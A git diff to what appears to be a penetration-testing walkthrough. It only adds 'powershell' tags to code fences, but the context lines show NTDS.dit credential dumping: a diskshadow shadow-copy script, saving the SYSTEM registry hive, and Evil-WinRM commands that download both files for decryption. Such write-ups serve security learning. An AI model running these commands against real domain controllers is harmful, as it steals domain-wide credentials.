@@ -198,7 +198,7 @@ An in-depth guide for this can be found at https://www.ultimatewindowssecurity.c
 
 *Don't forget to add a space after each line*
 
-```
+```powershell
 set metadata C:\tmp\tmp.cabs 
 set context persistent nowriters 
 add volume c: alias someAlias 
@@ -292,12 +292,12 @@ I know, hard to imagine life without Github!
 
 In order to decrypt the NTDS.dit, you need the SYSTEM file as well:
 
-```
+```powershell
 *Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system
 ```
 Download NTDS.dit and SYSTEM:
 
-```
+```powershell
 *Evil-WinRM* PS C:\tmp> download ntds.dit
 
 *Evil-WinRM* PS C:\tmp> download system
